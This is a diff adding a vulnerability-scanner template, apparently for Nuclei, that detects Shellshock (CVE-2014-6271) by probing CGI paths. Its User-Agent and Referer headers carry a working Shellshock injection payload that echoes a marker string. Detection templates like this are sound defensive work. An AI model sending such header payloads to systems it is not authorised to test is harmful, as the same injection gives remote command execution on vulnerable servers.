@@ -1,0 +1,25 @@
+id: shellshock
+info:
+  name: "Bash Shellshock Detection (CVE-2014-6271)"
+  severity: critical
+  description: "Detection de la vulnerabilite Shellshock dans GNU Bash via les en-tetes HTTP."
+  tags: cve,cve2014,rce,bash,shellshock,critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/status"
+      - "{{BaseURL}}/cgi-bin/test"
+      - "{{BaseURL}}/cgi-bin/env.cgi"
+      - "{{BaseURL}}/cgi-bin/printenv"
+    headers:
+      User-Agent: "() { :;}; echo; echo shellshock_vulnerable"
+      Referer: "() { :;}; echo; echo shellshock_vulnerable"
+    matchers:
+      - type: word
+        words:
+          - "shellshock_vulnerable"
+      - type: status
+        status:
+          - 200
+    matchers-condition: and
